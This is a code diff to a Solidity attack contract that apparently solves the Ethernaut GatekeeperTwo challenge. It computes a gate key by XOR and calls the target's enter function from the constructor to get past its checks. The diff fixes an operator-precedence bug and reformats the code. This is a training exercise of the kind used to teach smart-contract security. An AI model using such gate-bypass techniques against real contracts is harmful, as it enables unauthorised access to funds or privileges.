@@ -21,15 +21,16 @@ passing Ethernaut's GatekeeperTwo contract address.
 pragma solidity ^0.6.0;
 
 contract GKTwoAttack {
+	constructor(address GKTwoAddr) public {
+		// If we know that a ^ b = c and that a ^ c = b,
+		// we can switch places betweeen C and B for finding B.
+		//                        a                                 ^         b        ==      c
+		// (uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1)
+		bytes8 _gateKey = bytes8(
+			uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)
+		);
 
-  constructor (address GKTwoAddr) public {
-    // If we know that a ^ b = c and that a ^ c = b, 
-    // we can switch places betweeen C and B for finding B.
-    //                        a                                 ^         b        ==      c
-    // (uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1)
-    bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
-
-    // With the adquired key, we call the enter function via encodeWithSignature
-    GKTwoAddr.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
-  }
+		// With the adquired key, we call the enter function via encodeWithSignature
+		GKTwoAddr.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
+	}
 }
